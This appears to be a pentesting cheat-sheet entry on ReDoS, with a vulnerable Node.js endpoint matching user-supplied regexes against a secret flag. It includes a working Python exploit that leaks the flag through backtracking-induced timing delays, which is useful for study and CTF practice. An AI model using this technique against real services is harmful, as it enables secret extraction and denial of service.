# ReDos

## ReDos

The **Regular expression Denial of Service (ReDoS)** is a [Denial of Service](https://owasp.org/www-community/attacks/Denial_of_Service) attack, that exploits the fact that most Regular Expression implementations may reach extreme situations that cause them to work very slowly (exponentially related to input size). An attacker can then cause a program using a Regular Expression (Regex) to enter these extreme situations and then hang for a very long time. ([More Info](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS))

## Blind Regex Injection

Take the following code as an example:

```
const regExp = require('time-limited-regular-expressions')({ limit: 2 });

app.get("/",(req,res)=>{
	return res.render("index.html");
});
app.get("/license",(req,res)=>{
	return res.render("license.html");
});
const checkLicense = async (license) => {
    try {
        const match = await regExp.match(license, process.env.FLAG)
        return !!match;
    } catch (error) {
        return false;
    }
}
```

Exploit Code

```
import requests, time, string

deactivate_endpoint = "http://127.0.0.1:8000/license"

def brute_force_flag():
    # Adding special chars could break the code
    alphabet = string.ascii_letters + "_"
    # If the time is less than 2000ms then the FLAG is wrong
    regex = '^(?=PAYLOAD.*})((.*)*)*salt$'

    current_guess = "FLAG{"
    while current_guess[::-1][0] != "}":
        for char in alphabet:
            payload = current_guess + char
            guess = regex.replace("PAYLOAD", payload)
            data = {
                "license": guess
            }
            # Time in ms matching burpsuit
            start = round(time.time()*1000)
            res = requests.post(deactivate_endpoint, data=data, proxies={"http": "http://127.0.0.1:8080"})
            end = round(time.time()*1000)
            calc = end - start
            if calc < 2000:
                continue
            else:
                print(current_guess)
                current_guess = current_guess + char

if __name__ == "__main__":
    brute_force_flag()
```

